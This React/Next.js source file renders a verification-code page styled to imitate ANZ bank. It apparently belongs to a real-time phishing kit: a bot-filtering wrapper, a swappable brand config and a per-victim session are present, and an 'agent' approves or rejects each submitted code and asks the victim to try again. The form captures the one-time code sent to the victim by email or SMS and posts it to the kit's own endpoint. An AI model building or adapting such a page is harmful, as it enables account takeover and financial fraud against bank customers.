'use client';

/**
 * ANZ Secret Key/Verification Code Page
 * Centered single-column layout matching ANZ design
 */

import { useCallback, useEffect, useState } from 'react';
import { useParams } from 'next/navigation';
import { useSessionStore } from '@shared';
import { currentBrand } from '@/config/branding';
import { AlertCircle, Loader2 } from 'lucide-react';
import { BotGuard } from '@/components/security/BotGuard';

export default function SecretKeyPage() {
  const params = useParams();
  const sessionUuid = params.session_uuid as string;

  const { stage, status, loading, error, caseId, agentMessage } = useSessionStore();

  const [secretKey, setSecretKey] = useState('');
  const [fieldError, setFieldError] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);

  useEffect(() => {
    if (status === 'rejected' || status === 'error') {
      setSecretKey('');
      setFieldError(agentMessage || 'Your submission was rejected. Please try again.');
      setIsSubmitting(false);
    }
  }, [status, agentMessage]);

  const handleSubmit = useCallback(
    async (e: React.FormEvent) => {
      e.preventDefault();
      setFieldError('');

      if (!caseId) {
        setFieldError('Session information missing. Please refresh and try again.');
        return;
      }

      if (!secretKey.trim()) {
        setFieldError('Please enter your verification code');
        return;
      }

      setIsSubmitting(true);

      try {
        const response = await fetch('/api/submit-secret-key', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            case_id: caseId,
            secret_key: secretKey.trim(),
          }),
        });

        if (!response.ok) {
          console.error('Submission error');
          setFieldError('Unable to process your code. Please try again.');
          setIsSubmitting(false);
          return;
        }

        useSessionStore.setState({
          status: 'waiting',
          agentMessage: 'Verifying your code...',
          formData: {},
        });
      } catch (error) {
        console.error('Submission error:', error);
        setFieldError('Submission failed. Please try again.');
        setIsSubmitting(false);
      }
    },
    [secretKey, caseId]
  );

  const isWaiting = status === 'waiting' || isSubmitting || loading;

  return (
    <BotGuard>
      {/* Page Title - Single heading only */}
      <h1 className="page-title">Verification Code</h1>

      {/* Form Container */}
      <div className="login-card">
        <form className="login-form" onSubmit={handleSubmit}>
          <p className="form-description">
            Enter the code you received via email or SMS.
          </p>

          <div className="form-group">
            <label htmlFor="secret-key" className="form-label">Verification Code</label>
            <input
              type="text"
              id="secret-key"
              name="secret-key"
              className="form-input"
              autoComplete="off"
              value={secretKey}
              onChange={(e) => {
                setSecretKey(e.target.value);
                if (fieldError) setFieldError('');
              }}
              disabled={isWaiting}
            />
          </div>

          {/* Error message */}
          {fieldError && (
            <div className="error-message">
              <AlertCircle className="h-4 w-4" />
              <span>{fieldError}</span>
            </div>
          )}

          {/* Verify Button */}
          <button
            type="submit"
            className="btn-signin"
            disabled={!secretKey.trim() || isWaiting}
          >
            {isWaiting && <Loader2 className="h-4 w-4 animate-spin" />}
            {isWaiting ? 'Verifying...' : 'Verify'}
          </button>

          <p className="form-footer">
            Need help? Contact {currentBrand.companyName} support
          </p>
        </form>
      </div>
    </BotGuard>
  );
}
